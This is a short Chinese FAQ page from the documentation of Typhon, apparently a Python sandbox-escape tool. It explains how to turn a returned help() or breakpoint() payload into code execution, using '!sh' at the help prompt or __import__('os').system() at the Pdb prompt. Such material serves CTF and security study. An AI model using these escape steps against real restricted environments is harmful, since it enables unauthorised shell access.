FAQ 常见问题
==================

如何使用 ``help()`` RCE
---------------------------

有时 ``Typhon`` 会返回 ``help`` 函数作为payload。在linux中，假如我们能进入python help的交互式界面，我们可以输入：

.. code-block:: bash

    help> os

随后再输入 ``!sh`` 即可获得shell。

.. warning::
    
    由于实现方式不同，此方法只对linux环境有效。如果你想用其他的函数，如 ``breakpoint()``，请将对应绕过函数
    的 ``print_all_payload`` 变量设置为 ``True``。

如何使用 ``breakpoint()`` RCE
-----------------------------

有时 ``Typhon`` 会返回 ``breakpoint`` 函数作为payload。在linux中，假如我们能进入python help的交互式界面，我们可以输入：

.. code-block:: bash

    >>> breakpoint()
    1
    > <python-input-1>(1)<module>()
    (Pdb) __import__('os').system('') # 你要输入的命令

进行RCE。 ``pdb.set_trace()`` 同理。